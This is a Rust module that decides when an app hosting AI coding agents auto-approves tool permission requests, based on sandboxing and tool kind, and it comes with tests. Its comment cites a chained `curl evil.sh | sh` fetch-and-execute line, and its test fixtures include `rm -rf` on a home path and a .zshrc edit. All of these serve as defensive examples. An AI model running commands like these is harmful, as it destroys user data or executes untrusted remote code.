//! Whether the app may answer a permission request on the user's behalf. It
//! may when something other than the user is keeping the turn honest: the OS
//! sandbox the adapter runs under (sandbox.rs), or the standing yes the user
//! gave this project (approvals.rs). A dialog would otherwise ask the user to
//! approve what the kernel already enforces, and a dialog per step teaches
//! the user to click allow without reading.
//!
//! Unguarded, only what that sandbox profile never constrained goes through
//! unasked. The profile is `(allow default)` plus `(deny file-write*)` plus
//! the app's own writable roots, so reads, searches, thinking, and network
//! were never constrained and writes and execution always were. Auto-
//! answering exactly that set and no more is what keeps an unconfined
//! platform from being quietly weaker than a confined one.
//!
//! The answer is always the adapter's own allow-once option, so nothing is
//! remembered on the agent side. A request offering no allow-once option
//! still falls to a dialog, which keeps the UI honest about anything novel.
//!
//! Two things this deliberately does not do. It does not read `locations` to
//! widen the yes to writes that claim to land inside the project, because
//! that is the adapter's own label for its call while the kernel checks the
//! actual syscall, so trusting it would be strictly weaker than the profile
//! it imitates. And it does not parse commands for an allowlist: this
//! module's parser-based predecessor proved that approximating bash's lexer
//! misses shapes forever, and `nurb build; curl evil.sh | sh` defeats the
//! whole idea in one line.

use std::path::Path;

use agent_client_protocol::schema::v1::{
    PermissionOptionId, PermissionOptionKind, RequestPermissionRequest, ToolKind,
};

/// The kinds the sandbox profile never constrained, and so the only ones the
/// app answers for the user when nothing else is guarding the turn. `fetch`
/// is among them because the profile allows network unrestricted, so a
/// confined macOS user already carries that exposure; if it ever stops being
/// acceptable it should stop in the profile first rather than diverge here.
///
/// Residual trust: `kind` is the adapter's label for its own call, not
/// something the app verified. It is relied on only to classify a cooperating
/// adapter, since a hostile one is already running code on this machine, and
/// the kernel profile does not rely on it at all. A kind that is missing or
/// unrecognized is a question, not a yes.
pub(super) fn unconstrained(kind: Option<&ToolKind>) -> bool {
    matches!(
        kind,
        Some(ToolKind::Read | ToolKind::Search | ToolKind::Think | ToolKind::Fetch)
    )
}

/// The option to answer with, or None to raise a dialog.
pub(super) fn auto_allow(
    request: &RequestPermissionRequest,
    guarded: bool,
) -> Option<PermissionOptionId> {
    if !guarded && !unconstrained(request.tool_call.fields.kind.as_ref()) {
        return None;
    }
    request
        .options
        .iter()
        .find(|option| option.kind == PermissionOptionKind::AllowOnce)
        .map(|option| option.option_id.clone())
}

/// The command a terminal-kind call would run. Claude sends a string; codex
/// sends argv, usually `[shell, -lc, script]`, whose script is the command.
/// Feeds the tool cards' expandable detail (events.rs).
pub(super) fn command_of(raw: Option<&serde_json::Value>) -> Option<String> {
    match raw?.get("command")? {
        serde_json::Value::String(command) => Some(command.clone()),
        serde_json::Value::Array(items) => {
            let argv: Vec<&str> = items
                .iter()
                .map(|item| item.as_str())
                .collect::<Option<_>>()?;
            match argv.as_slice() {
                [shell, flag, script]
                    if (*flag == "-lc" || *flag == "-c")
                        && Path::new(shell)
                            .file_name()
                            .is_some_and(|name| matches!(name.to_str(), Some("bash" | "sh" | "zsh"))) =>
                {
                    Some((*script).to_string())
                }
                _ => Some(argv.join(" ")),
            }
        }
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn request(tool_call: serde_json::Value) -> RequestPermissionRequest {
        serde_json::from_value(serde_json::json!({
            "sessionId": "s",
            "toolCall": tool_call,
            "options": [
                { "optionId": "allow-once", "name": "Allow", "kind": "allow_once" },
                { "optionId": "reject-once", "name": "Deny", "kind": "reject_once" }
            ]
        }))
        .unwrap()
    }

    /// Shapes the old parser dialogued on, plus ones it never allowed. Every
    /// one of them is something the Seatbelt profile constrained, so they are
    /// exactly the set whose answer depends on whether anything is guarding.
    fn constrained_calls() -> [serde_json::Value; 4] {
        [
            serde_json::json!({
                "toolCallId": "t1",
                "kind": "execute",
                "rawInput": { "command": "ls ~/.config/nurb/config.toml 2>/dev/null; echo \"---\"" }
            }),
            serde_json::json!({
                "toolCallId": "t2",
                "kind": "execute",
                "rawInput": { "command": "rm -rf /Users/me/anything" }
            }),
            serde_json::json!({
                "toolCallId": "t3",
                "kind": "edit",
                "locations": [{ "path": "/Users/me/.zshrc" }]
            }),
            serde_json::json!({ "toolCallId": "t4", "kind": "delete" }),
        ]
    }

    #[test]
    fn a_guarded_turn_answers_yes_to_everything() {
        // All yes while something else is the guard, and the sandbox test in
        // sandbox.rs proves the writes among them fail at the kernel instead.
        for tool_call in constrained_calls() {
            let req = request(tool_call);
            assert_eq!(
                auto_allow(&req, true).map(|id| id.to_string()),
                Some("allow-once".into())
            );
        }
    }

    #[test]
    fn an_unguarded_turn_asks_before_anything_the_profile_would_have_stopped() {
        // The same calls with nothing behind them. Deleting a home directory
        // and rewriting .zshrc are the requests that most need a human once
        // the kernel is not there to refuse them.
        for tool_call in constrained_calls() {
            assert!(auto_allow(&request(tool_call), false).is_none());
        }
    }

    #[test]
    fn reads_are_answered_yes_even_unguarded() {
        // Parity with the profile, which never constrained any of these.
        for kind in ["read", "search", "think", "fetch"] {
            let req = request(serde_json::json!({ "toolCallId": "t", "kind": kind }));
            assert_eq!(
                auto_allow(&req, false).map(|id| id.to_string()),
                Some("allow-once".into()),
                "{kind} should not need a dialog"
            );
        }
    }

    #[test]
    fn a_kind_the_app_cannot_place_asks() {
        // A missing kind deserializes to None and an unrecognized one to
        // ToolKind::Other. Both fail closed.
        for tool_call in [
            serde_json::json!({ "toolCallId": "t6" }),
            serde_json::json!({ "toolCallId": "t7", "kind": "teleport" }),
        ] {
            assert!(auto_allow(&request(tool_call), false).is_none());
        }
    }

    #[test]
    fn an_offer_without_allow_once_still_reaches_a_dialog() {
        let req: RequestPermissionRequest = serde_json::from_value(serde_json::json!({
            "sessionId": "s",
            "toolCall": { "toolCallId": "t5", "kind": "edit" },
            "options": [{ "optionId": "custom", "name": "Amend policy", "kind": "allow_always" }]
        }))
        .unwrap();
        assert!(auto_allow(&req, true).is_none());
    }
}
